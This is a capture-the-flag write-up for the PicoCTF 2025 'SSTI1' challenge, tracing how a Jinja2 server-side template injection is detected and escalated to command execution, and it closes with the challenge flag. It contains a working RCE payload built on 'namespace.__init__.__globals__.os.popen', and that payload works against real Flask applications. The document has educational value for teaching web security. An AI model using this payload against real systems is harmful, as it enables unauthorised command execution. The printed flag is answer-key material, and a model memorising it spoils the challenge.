# PicoCTF 2025 - SSTI1 Write-up

## Challenge Description
We are given a web challenge with the tags **Easy, Web Exploitation, Browser Webshell Solvable**. The name of the challenge, **SSTI1**, hints at a possible **Server-Side Template Injection (SSTI)** vulnerability.

## Enumeration
### Step 1: Identifying the Backend Technology
Upon visiting the website and submitting some test text, we can inspect the **HTTP response headers** and confirm that the application is running on **Python**, which suggests the possible use of **Flask** or another Python-based framework.

![HTTP Headers Showing Python](https://raw.githubusercontent.com/v0idsec/PicoCTF-2025/main/images/SSTI1/Response%20Headers.png)

### Step 2: Testing for SSTI
To confirm SSTI, we use the classic **`{{ 7 * 7 }}`** test input. If the response evaluates the expression instead of displaying it as plain text, then SSTI is present.

#### Payload:
```jinja
{{ 7 * 7 }}
```

#### Response:
```
49
```
This confirms **Server-Side Template Injection (SSTI)**.

![SSTI Test Response](https://raw.githubusercontent.com/v0idsec/PicoCTF-2025/main/images/SSTI1/SSTI%20test.png)

### Step 3: Checking for Jinja2
To determine the template engine, we use:

#### Payload:
```jinja
{{ config }}
```

#### Response:
This reveals configuration details, which strongly suggests that the template engine is **Jinja2**, commonly used with Flask applications.

![Jinja2 Config Response](https://raw.githubusercontent.com/v0idsec/PicoCTF-2025/main/images/SSTI1/Config%20reponse.png)

## Exploiting SSTI for Remote Code Execution
We attempt to leverage SSTI to execute system commands and retrieve the flag. 

### Step 4: Using SSTI to Execute Commands
From **PayloadAllTheThings**, we know that Jinja2 SSTI can be exploited for **Remote Code Execution (RCE)** by accessing the Python built-in modules.

We construct an SSTI payload to search for files containing the known **flag format (`picoCTF`)**:

#### Payload:
```jinja
{{ namespace.__init__.__globals__.os.popen('grep picoCTF . -rnw').read() }}
```

#### Explanation:
- `namespace.__init__.__globals__` gives us access to **Python's global scope**.
- `os.popen('grep picoCTF . -rnw')` executes the shell command **`grep picoCTF . -rnw`**, which searches for the flag in the current directory.
- `.read()` reads the output of the command.

#### Response:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```
We successfully retrieve the **flag**!

![Flag Found](https://raw.githubusercontent.com/v0idsec/PicoCTF-2025/main/images/SSTI1/Flag.png)

## Conclusion
This challenge demonstrates the exploitation of **Server-Side Template Injection (SSTI)** in a Python Flask application using the **Jinja2 template engine**. Proper input sanitization and secure template rendering practices should be implemented to mitigate such vulnerabilities.

### **Lessons Learned**:
- Always check for **SSTI** using simple arithmetic payloads like `{{ 7 * 7 }}`.
- Identify the template engine by checking for configuration objects (`{{ config }}`).
- Exploit SSTI for **RCE** by accessing Python’s built-in modules (`__globals__` → `os.popen`).
- Secure web applications by **disabling template-based code execution** and **validating user inputs**.

### **Resources**:
- [PayloadAllTheThings - SSTI Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---
**Flag:** picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
